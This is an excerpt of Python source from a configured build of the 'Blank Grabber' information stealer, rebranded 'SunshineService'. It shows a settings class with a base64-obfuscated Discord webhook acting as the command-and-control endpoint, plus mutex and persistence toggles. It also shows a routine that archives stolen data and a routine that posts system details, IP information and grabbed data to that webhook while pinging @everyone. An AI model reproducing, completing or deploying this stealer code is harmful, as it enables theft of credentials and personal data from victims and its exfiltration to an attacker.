...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQxNDM0ODA5MjI2NTcyNTk5Mi9PMUVLdW1PcTBFTFpUeXdfM0hBaTRCMmw2VDU0a3VRZmJsanYwSTdyUWNWUk55WENRUGVEcGxjMWZJWm1rcmh2WFF0QQ==').decode())
    Mutex = base64.b64decode('akNnS2xjb2oxWDZ4bjVXag==').decode()
    PingMe = bool('true')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
...
class BlankGrabber:
    ...
    def __init__(self) -> None:
        self.Separator = '\n\n' + 'Blank Grabber \\ SunshineService '.center(50, '=') + '\n\n'
        while True:
    ...
    def CreateArchive(self) -> tuple[str, str]:
        ...
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            ...
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or 'Sunshine1234'
    ...
    def SendData(self) -> None:
        ...
        match Settings.C2[0]:
            case 0:
                ...
                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Blank Grabber \\ SunshineService', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/Blank-c/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Blank Grabber \\ SunshineService | https://github.com/Blank-c/Blank-Grabber \\ discord.gg/SunshineServiceFR'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber \\ SunshineService', 'avatar_url': image_url}
